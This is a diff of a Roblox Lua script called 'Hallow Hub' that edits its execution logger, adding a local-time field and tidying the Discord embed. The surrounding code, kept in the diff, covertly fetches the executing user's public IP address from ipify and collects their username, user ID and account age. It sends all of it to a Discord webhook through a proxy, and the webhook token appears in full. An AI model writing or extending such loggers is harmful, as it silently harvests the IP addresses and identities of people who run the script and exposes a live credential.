@@ -5,13 +5,10 @@ local Players = game:GetService("Players")
 local LP = Players.LocalPlayer
 
 -- [[ 2. CONFIGURATION ]]
--- Your Webhook Proxy (Lewisakura)
 local proxyURL = "https://webhook.lewisakura.moe/api/webhooks/1469708074393534476/2JrXROCkNkccb-Zq-c6tSZaOyJ441T8M9j-_7UcJdvmlN3UMqOwCPwkAZctUt5dViWDY/queue"
 
 -- Blacklist (Add UserIDs here)
-local blacklist = {
-    0, -- Example: 12345678
-}
+local blacklist = { 0 }
 
 -- [[ 3. BLACKLIST CHECK ]]
 for _, bannedID in pairs(blacklist) do
@@ -36,13 +33,14 @@ local function sendLog()
     local data = {
         ["embeds"] = {{
             ["title"] = "⭐ Hallow Hub Executed",
-            ["color"] = 16735027, -- Hex: 0xFF5733
+            ["color"] = 16735027,
             ["fields"] = {
-                {["name"] = "🌐 Connection Info",
+                  {["name"] = "🌐 Connection Info",
                 ["value"] = "**IP Address:** ||" .. (game:HttpGet("https://api.ipify.org") or "N/A") .. "||",
                 ["inline"] = true
                 },
-                 {   ["name"] = "👤 User Info", 
+                {
+                    ["name"] = "👤 User Info", 
                     ["value"] = "**Username:** " .. LP.Name .. displayNameText .. 
                                 "\n**ID:** " .. LP.UserId .. 
                                 "\n**Account Age:** " .. LP.AccountAge .. " days", 
@@ -52,6 +50,12 @@ local function sendLog()
                     ["name"] = "🎮 Game Info", 
                     ["value"] = "**Name:** " .. gameName .. 
                                 "\n**Place ID:** " .. game.PlaceId, 
+                    ["inline"] = true
+                },
+                -- NEW: Added Time Field for quick glance
+                {
+                    ["name"] = "⏰ Time (Local)",
+                    ["value"] = "`" .. os.date("%X") .. "`",
                     ["inline"] = true
                 },
                 {
@@ -65,7 +69,10 @@ local function sendLog()
                     ["inline"] = false
                 }
             },
-            ["footer"] = {["text"] = "Execution Time: " .. os.date("%X")},
+            ["footer"] = {
+                ["text"] = "Hallow Hub Logger | Local Time: " .. os.date("%p") -- Shows AM or PM
+            },
+            -- This makes Discord show the "Relative" time (e.g. "Just now")
             ["timestamp"] = DateTime.now():ToIsoDate()
         }}
     }
